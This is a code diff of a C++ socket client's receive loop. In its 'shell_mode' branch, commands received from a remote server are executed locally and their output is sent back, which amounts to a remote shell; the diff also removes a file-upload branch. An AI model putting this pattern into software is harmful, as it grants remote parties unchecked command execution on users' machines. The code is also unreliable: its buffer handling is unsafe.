@@ -607,24 +607,14 @@ ClientTypes::SocketStatus SocketClient::recvHandler() {
         __raw_pool pool(server.size());
 
         for (auto& _: server) {
-            std::vector<char> r_buffer(1);
-
             std::function<bool()> fnc = [&]{
-                while (::recv(_.socket_, r_buffer.data(), 1, 0)) {
+                std::cout << "thread: " << std::this_thread::get_id() << std::endl;
+
+                std::vector<char> r_buffer(1024);
+
+                while (::recv(_.socket_, r_buffer.data(), 1024, 0)) {
                     if (r_buffer[0] == ClientTypes::chr_handler::upload_mode) {
-                        std::cout << "update" << std::endl;
-
-                        std::vector<char> buffer(__INT16_MAX__);
-
-                        if (::recv(_.socket_, buffer.data(), buffer.size(), 0) < 0)
-                            return false;
-
-                        std::string path = buffer.data();
-
-                        if (sstatus_t::err_socket_ok != this->uploadBy(_.CID, path))
-                            return false;
-
-                        r_buffer.clear();
+                        
                     }
 
                     if (r_buffer[0] == ClientTypes::chr_handler::shell_mode) {
@@ -644,20 +634,21 @@ ClientTypes::SocketStatus SocketClient::recvHandler() {
                             return result;
                         };
 
-                        std::string command;
+                        std::string command_b = r_buffer.data();
+                        std::string command_a;
 
-                        for (uint32_t i = 1; i < r_buffer.size(); i++)
-                            command.push_back(r_buffer[i]);
+                        for (const auto& _: command_b)
+                            if (_ != ClientTypes::chr_handler::shell_mode)
+                                command_a.push_back(_);
 
-                        std::string __log = execlp(command.c_str());
+                        //std::cout << command_a << std::endl;
 
-                        if (!__log.size())
+                        command_b = execlp(command_a.c_str());
+
+                        if (sstatus_t::err_socket_ok != this->sendBy(_.CID, command_b))
                             return false;
 
-                        if (::send(_.socket_, __log.c_str(), __log.size(), 0) < 0)
-                            return false;
-
-                        r_buffer.clear();
+                        return true;
                     }
 
                     if (r_buffer[0] == ClientTypes::chr_handler::ping_mode) {
